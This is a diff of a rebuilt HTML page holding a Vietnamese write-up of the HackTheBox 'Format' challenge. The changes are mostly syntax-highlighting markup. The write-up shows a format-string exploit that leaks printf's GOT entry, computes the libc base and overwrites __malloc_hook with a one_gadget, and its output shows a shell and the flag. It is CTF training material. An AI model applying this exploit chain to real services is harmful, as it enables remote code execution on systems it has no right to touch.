 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2292,16 +2288,16 @@ pwndbg&gt;
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python3" data-lang="python3"><span class="o">...</span>
-<span class="c1"># ------------- Leaking _printf address through printf()</span>
-<span class="n">printf_got_ptl</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;printf&#34;</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;printf@got.plt address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_got_ptl</span><span class="p">)))</span>
-<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAA%7$s&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_got_ptl</span><span class="p">))</span>
-<span class="n">printf_leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">printf_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">printf_leak</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
-<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked __printf: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_libc</span><span class="p">)))</span>
-<span class="o">...</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python3" data-lang="python3"><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># ------------- Leaking _printf address through printf()</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_got_ptl</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&#34;printf&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;printf@got.plt address: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_got_ptl</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;AAAA%7$s&#39;</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">printf_got_ptl</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_leak</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">printf_libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">printf_leak</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Leaked __printf: </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">printf_libc</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Chúng ta lấy địa chỉ <code>printf@plt</code> thông qua lệnh <code>elf.got[&quot;printf&quot;]</code>, sau đó gửi payload có dạng <code>&quot;AAAA%7$s&quot; + p64(printf_got_ptl)</code>. Số <code>7</code> ở đây là vì địa chỉ của got <code>p64(printf_got_ptl)</code> năm ở vị trí thứ 7 trên stack, do đó <code>%7s</code> sẽ lấy địa chỉ này ra và in giá trị chứa trong nó cũng chính là địa chỉ <code>libc</code>.</li>
@@ -2309,7 +2305,7 @@ pwndbg&gt;
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2323,25 +2319,23 @@ pwndbg&gt;
 </span><span class="lnt">12
 </span><span class="lnt">13
 </span><span class="lnt">14
-</span><span class="lnt">15
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 exploit.py
-<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
-    Arch:     amd64-64-little
-    RELRO:    Full RELRO
-    Stack:    Canary found
-    NX:       NX enabled
-    PIE:      PIE enabled
-<span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./format&#39;</span>: pid 15866
-<span class="o">[</span>+<span class="o">]</span> attach gdb
-<span class="o">[</span>+<span class="o">]</span> LEAK : init+117 address: b<span class="s1">&#39;0x563d767e026d\n&#39;</span>
-<span class="o">[</span>*<span class="o">]</span> Base ELF address: 0x563d767df000
-<span class="o">[</span>*<span class="o">]</span> printf@got.plt address: 0x563d767e2fc0
-<span class="o">[</span>+<span class="o">]</span> Leaked __printf: 0x7fc6d53d6e10
-<span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./format&#39;</span> <span class="o">(</span>pid 15866<span class="o">)</span>
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ python3 exploit.py
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Full RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Starting <span class="nb">local</span> process <span class="s1">&#39;./format&#39;</span>: pid <span class="m">15866</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> attach gdb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> LEAK : init+117 address: b<span class="s1">&#39;0x563d767e026d\n&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Base ELF address: 0x563d767df000
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> printf@got.plt address: 0x563d767e2fc0
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Leaked __printf: 0x7fc6d53d6e10
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Stopped process <span class="s1">&#39;./format&#39;</span> <span class="o">(</span>pid 15866<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Sử dụng <a href="https://libc.blukat.me/">libc.blukat.me</a>  và địa chỉ của libc vừa có được để kiểm tra phiên bản của libc.</li>
@@ -2356,7 +2350,7 @@ pwndbg&gt;
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2371,33 +2365,33 @@ pwndbg&gt;
 </span><span class="lnt">13
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ one_gadget libc6_2.27-3ubuntu1_amd64.so
-0x4f2c5 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
-constraints:
-  rsp <span class="p">&amp;</span> <span class="nv">0xf</span> <span class="o">==</span> 0
-  <span class="nv">rcx</span> <span class="o">==</span> NULL
-
-0x4f322 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
-constraints:
-  <span class="o">[</span>rsp+0x40<span class="o">]</span> <span class="o">==</span> NULL
-
-0x10a38c execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span class="o">)</span>
-constraints:
-  <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ one_gadget libc6_2.27-3ubuntu1_amd64.so
+</span></span><span class="line"><span class="cl">0x4f2c5 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  rsp <span class="p">&amp;</span> <span class="nv">0xf</span> <span class="o">==</span> <span class="m">0</span>
+</span></span><span class="line"><span class="cl">  <span class="nv">rcx</span> <span class="o">==</span> NULL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0x4f322 execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x40, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x40<span class="o">]</span> <span class="o">==</span> NULL
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">0x10a38c execve<span class="o">(</span><span class="s2">&#34;/bin/sh&#34;</span>, rsp+0x70, environ<span class="o">)</span>
+</span></span><span class="line"><span class="cl">constraints:
+</span></span><span class="line"><span class="cl">  <span class="o">[</span>rsp+0x70<span class="o">]</span> <span class="o">==</span> NULL
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Tiếp theo, chúng ta tính các địa chỉ cần thiết. Với libc khi chưa chạy, chúng ta đọc địa chỉ của <code>printf</code>:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ objdump -TR libc6_2.27-3ubuntu1_amd64.so<span class="p">|</span> grep <span class="s2">&#34; printf</span>$<span class="s2">&#34;</span>
-0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 <span class="nb">printf</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">➜  Format git:<span class="o">(</span>main<span class="o">)</span> ✗ objdump -TR libc6_2.27-3ubuntu1_amd64.so<span class="p">|</span> grep <span class="s2">&#34; printf</span>$<span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">0000000000064e80 g    DF .text  00000000000000c3  GLIBC_2.2.5 <span class="nb">printf</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>Chúng ta thấy rằng khoảng cách từ printf tới base address là <code>0x64e80</code>, do đó, để tính base address, chúng ta lấy địa chỉ của <code>printf</code> leak được khi thực thi trừ đi <code>0x64e80</code>.</p>
 <ul>
@@ -2405,24 +2399,24 @@ constraints:
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Calculating base libc, __malloc_hook and one_gadget ---</span>
-<span class="n">base_libc</span> <span class="o">=</span> <span class="n">printf_libc</span> <span class="o">-</span> <span class="mh">0x64e80</span>
-<span class="n">malloc_hook_addr</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="mh">0x00000000003ebc30</span>
-<span class="n">one_gadget</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="mh">0x4f322</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Calculating base libc, __malloc_hook and one_gadget ---</span>
+</span></span><span class="line"><span class="cl"><span class="n">base_libc</span> <span class="o">=</span> <span class="n">printf_libc</span> <span class="o">-</span> <span class="mh">0x64e80</span>
+</span></span><span class="line"><span class="cl"><span class="n">malloc_hook_addr</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="mh">0x00000000003ebc30</span>
+</span></span><span class="line"><span class="cl"><span class="n">one_gadget</span> <span class="o">=</span> <span class="n">base_libc</span> <span class="o">+</span> <span class="mh">0x4f322</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Ta sử dụng <a href="https://docs.pwntools.com/en/stable/fmtstr.html#module-pwnlib.fmtstr">pwnlib.fmtstr</a> - công cụ khai thác lỗi format string để tính và ghi đè địa chỉ <code>__malloc_hook</code> với one gadget và kích hoạt nó.</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -2430,13 +2424,13 @@ constraints:
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># Overriding __malloc_hook with one_gadget ---</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">malloc_hook_addr</span><span class="p">:</span> <span class="n">one_gadget</span><span class="p">}))</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%100000$c&#39;</span><span class="p">)</span> <span class="c1"># __malloc_hook trigger</span>
-<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Overriding __malloc_hook with one_gadget ---</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="p">{</span><span class="n">malloc_hook_addr</span><span class="p">:</span> <span class="n">one_gadget</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%100000$c&#39;</span><span class="p">)</span> <span class="c1"># __malloc_hook trigger</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="bước-4---chạy-mã-khai-thác">Bước 4 - Chạy mã khai thác</h2>
 <ul>
@@ -2444,7 +2438,7 @@ constraints:
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2472,33 +2466,33 @@ constraints:
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="err">➜</span>  <span class="n">Format</span> <span class="n">git</span><span class="p">:(</span><span class="n">main</span><span class="p">)</span> <span class="err">✗</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
-    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
-    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
-    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
-    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
-    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">167.99</span><span class="o">.</span><span class="mf">202.131</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">32399</span><span class="p">:</span> <span class="n">Done</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">LEAK</span> <span class="p">:</span> <span class="n">init</span><span class="o">+</span><span class="mi">117</span> <span class="n">address</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;0x55afb922b26d</span><span class="se">\n</span><span class="s1">&#39;</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Base</span> <span class="n">ELF</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x55afb922a000</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">printf</span><span class="nd">@got.plt</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x55afb922dfc0</span>
-<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__printf</span><span class="p">:</span> <span class="mh">0x7f6b96c3be80</span>
-<span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span> <span class="n">BytesWarning</span><span class="p">:</span> <span class="n">Text</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">;</span> <span class="n">assuming</span> <span class="n">ASCII</span><span class="p">,</span> <span class="n">no</span> <span class="n">guarantees</span><span class="o">.</span> <span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">pwntools</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="c1">#bytes</span>
-  <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%100000$c&#39;</span><span class="p">)</span> <span class="c1"># __malloc_hook trigger</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">trigged</span> <span class="n">malloc_hook</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
-<span class="err">$</span> <span class="n">ls</span>
-<span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">format</span>
-<span class="n">run_challenge</span><span class="o">.</span><span class="n">sh</span>
-<span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
-<span class="n">HTB</span><span class="p">{</span><span class="n">mall0c_h00k_f0r_th3_w1n</span><span class="err">!</span><span class="p">}</span>
-<span class="err">$</span> 
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
-<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">167.99</span><span class="o">.</span><span class="mf">202.131</span> <span class="n">port</span> <span class="mi">32399</span>
-<span class="err">➜</span>  <span class="n">Format</span> <span class="n">git</span><span class="p">:(</span><span class="n">main</span><span class="p">)</span> <span class="err">✗</span> 
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="err">➜</span>  <span class="n">Format</span> <span class="n">git</span><span class="p">:(</span><span class="n">main</span><span class="p">)</span> <span class="err">✗</span> <span class="n">python3</span> <span class="n">exploit</span><span class="o">.</span><span class="n">py</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="s1">&#39;/home/ubuntu/Edisc/CTF/pwn-college/hackthebox/Format/format&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+</span></span><span class="line"><span class="cl">    <span class="n">RELRO</span><span class="p">:</span>    <span class="n">Full</span> <span class="n">RELRO</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PIE</span><span class="p">:</span>      <span class="n">PIE</span> <span class="n">enabled</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">167.99.202.131</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">32399</span><span class="p">:</span> <span class="n">Done</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">LEAK</span> <span class="p">:</span> <span class="n">init</span><span class="o">+</span><span class="mi">117</span> <span class="n">address</span><span class="p">:</span> <span class="sa">b</span><span class="s1">&#39;0x55afb922b26d</span><span class="se">\n</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Base</span> <span class="n">ELF</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x55afb922a000</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">printf</span><span class="nd">@got.plt</span> <span class="n">address</span><span class="p">:</span> <span class="mh">0x55afb922dfc0</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Leaked</span> <span class="n">__printf</span><span class="p">:</span> <span class="mh">0x7f6b96c3be80</span>
+</span></span><span class="line"><span class="cl"><span class="n">exploit</span><span class="o">.</span><span class="n">py</span><span class="p">:</span><span class="mi">65</span><span class="p">:</span> <span class="ne">BytesWarning</span><span class="p">:</span> <span class="n">Text</span> <span class="ow">is</span> <span class="ow">not</span> <span class="nb">bytes</span><span class="p">;</span> <span class="n">assuming</span> <span class="n">ASCII</span><span class="p">,</span> <span class="n">no</span> <span class="n">guarantees</span><span class="o">.</span> <span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">docs</span><span class="o">.</span><span class="n">pwntools</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="c1">#bytes</span>
+</span></span><span class="line"><span class="cl">  <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%100000$c&#39;</span><span class="p">)</span> <span class="c1"># __malloc_hook trigger</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">trigged</span> <span class="n">malloc_hook</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Switching</span> <span class="n">to</span> <span class="n">interactive</span> <span class="n">mode</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">ls</span>
+</span></span><span class="line"><span class="cl"><span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="nb">format</span>
+</span></span><span class="line"><span class="cl"><span class="n">run_challenge</span><span class="o">.</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> <span class="n">cat</span> <span class="n">flag</span><span class="o">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">HTB</span><span class="p">{</span><span class="n">mall0c_h00k_f0r_th3_w1n</span><span class="err">!</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="err">$</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Interrupted</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Closed</span> <span class="n">connection</span> <span class="n">to</span> <span class="mf">167.99.202.131</span> <span class="n">port</span> <span class="mi">32399</span>
+</span></span><span class="line"><span class="cl"><span class="err">➜</span>  <span class="n">Format</span> <span class="n">git</span><span class="p">:(</span><span class="n">main</span><span class="p">)</span> <span class="err">✗</span> 
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>Mã khai thác: <a href="https://github.com/minhlongmt183/pwn-college/blob/main/hackthebox/Format/exploit.py">exploit.py</a></li>
@@ -2998,7 +2992,7 @@ constraints:
 </div>
 
 
-<script defer src="/js/swipe.min.b4b82839155519d9ca67746615a4c86ccbc1061c196fe6d8aa26e4fe22902718.js"></script>
+<script defer src="/js/swipe.min.7be2debdadbc35f9430de39f9010d89df5aee1904747098818b5c01cd0672180.js"></script>
 
 <script defer src="/js/micromodal.min.de01b44b2f383056bbcaf6ee921fd385d79108ec1129afd0eb2f3f5a07e11f45.js"></script>
 
@@ -3657,7 +3651,7 @@ document.addEventListener('DOMContentLoaded', function () {
       e.trigger.classList.add('tooltipped');
       e.trigger.classList.add('tooltipped-s');
     });
-    // =================================================================
+    
 
 
 
